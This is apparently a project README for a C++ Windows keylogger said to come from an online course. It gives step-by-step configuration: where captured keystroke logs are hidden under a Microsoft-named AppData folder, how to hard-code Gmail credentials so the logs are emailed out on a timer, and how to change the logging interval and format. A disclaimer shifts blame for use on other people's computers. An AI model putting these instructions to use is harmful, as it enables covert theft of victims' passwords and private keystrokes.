# keylogger
This is Keylogger made using c++ programming language that works on Window 7, 8, 8.1, And 10 - **Use at your own discretion** <br/><br/>

This is a keylogger I learned from Udemy for educational purposes.

If you would like to take the course yourself, check it out [here](https://www.udemy.com/how-to-create-an-advanced-keylogger-from-scratch-for-windows).

## Important Information
  * Log files by default are stored in C:\Users\($User)\AppData\Roaming\Microsoft\CLR
  * Problems may occur if the Keylogger in ran multiple times when one is still running
  * Default name to look for in the task manager to end the keylogger process is Keylogger.exe
## Email
Required if user wants the log to be sent to an email.

Open SendMail.h
```
located at ..\Cpp-Keylogger\Keylogger\SendMail.h
```
Edit line 16 for where the log should be sent from (default: gmail only, look at Other Emails section for changing that)
```
line 16: #define X_EM_TO "our.destination@email.address" // change the string to source email
```
Edit line 17 for where the log should be sent to (can be same as above or any other email is fine)
```
line 17: #define X_EM_FROM "Address of sender" // change the string to destination email
```
Edit line 18 for powershell to login to source email (required for email to be sent)
```
line 18: X_EM_PASS "password" // change the string to password of source email
```
## Configuring the Source Email
For gmail, allow less secure apps access your source email so the program can construct and send the email.
The steps needed to do this is documented [here](https://support.google.com/accounts/answer/6010255?hl=en) on Google Support. <br/>
Refer to Other Emails section if the source email is not gmail.

## Setting the Interval Time
Here, the user can set the interval at which each log file is created and sent

Open KeybHook.h
```
located at ..\Cpp-Keylogger\Keylogger\KeybHook.h
```
Edit line 36 with the desired time (default is 30 seconds)
```
line 36: Timer MailTimer(TimerSendMail, 500 * 60, Timer::Infinite); // change the second argument to desired time (milliseconds)
```
## Formatting Each Read Letter
Here, the user can set how the log file formats the read keys

Open Helper.h
```
located at ..\Cpp-Keylogger\Keylogger\Helper.h
```
Edit lines 77 - 83 to change how single keys are formated
```
line 77: void WriteAppLog(const std::string &s) // function responsible for format of each key in log (default: [a][b][c])
```

## License
This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details

## Disclaimer
Any usage of this keylogger on a computer that is not owned by you or do not have permissions, **YOU ARE RESPONSIBLE FOR THE OUTCOME**. Not me.

## Acknowledgments
Hat tip to Ermin's amazing course on creating a keylogger, check out his profile and other courses [here!](https://www.udemy.com/user/erminkreponic/)
